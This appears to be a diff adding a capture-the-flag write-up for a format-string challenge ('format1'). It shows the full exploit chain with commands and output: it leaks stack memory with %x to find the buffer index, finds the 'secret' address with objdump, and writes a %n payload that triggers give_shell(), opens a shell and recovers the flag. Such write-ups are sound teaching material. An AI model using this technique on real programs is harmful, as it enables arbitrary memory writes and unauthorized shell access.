@@ -72,3 +72,51 @@ ayy
 Sorry, secret = 0
 blaccmail@localhost:~$ 
 ```
+To Exploit the program we need :
+```
+-> Trigger give_shell()
+-> Know the buf index
+-> Know the address to write ('secret' address)
+-> Know what to write a.k.a the exploit
+```
+To find the buf index, we need to leak the program memory by using ```%x``` printf argument :
+```
+blaccmail@localhost:~$ python -c "print 'A'*4 + '-%x-%x-%x-%x-%x-%x-%x-%x'" | ./format.exe
+AAAA-80-f7785580-ffb064f4-ffb063fe-1-c2-41414141
+Sorry, secret = 0
+blaccmail@localhost:~$
+```
+Looks like the string placed in index 7.
+
+Then we need to find 'secret' address to change its value. We can use ```objdump``` command :
+```
+blaccmail@localhost:~$ objdump -t format.exe | grep secret
+0804a040 g     O .bss   00000004              secret
+blaccmail@localhost:~$ 
+```
+
+Great! we have found all the things we need, now we can craft our exploit :
+```
+-------------------------------------------------------------
+python -c "print '\x40\xa0\x04\x08%188x%7$n'" | ./format.exe
+-------------------------------------------------------------
+-> \x40\xa0\x04\x08 : 4bit 'secret' address
+-> %188x            : 188bit junk value (4+188 = 192 wich is exact value to trigger give_shell())
+-> %7$n             : index & shell
+```
+
+Now, lets try that :
+```
+blaccmail@localhost:~$ python -c "print '\x40\xa0\x04\x08%188x%7$n'" | ./format.exe
+@�                                                                                                                                                                                          80
+sh-4.3# exit
+blaccmail@localhost:~$ 
+```
+
+Yes! we got it, then move on to the real thing and then cat the flag :
+```
+cat flag.txt
+[2]+  Stopped                 ( python2 -c 'print "\x40\xa0\x04\x08%188x%7$n"'; cat ) | ./format1
+team24254@shell:/problems/format1$ is_%n_used_for_anything_besides_this
+```
+# Flag : {is_%n_used_for_anything_besides_this}
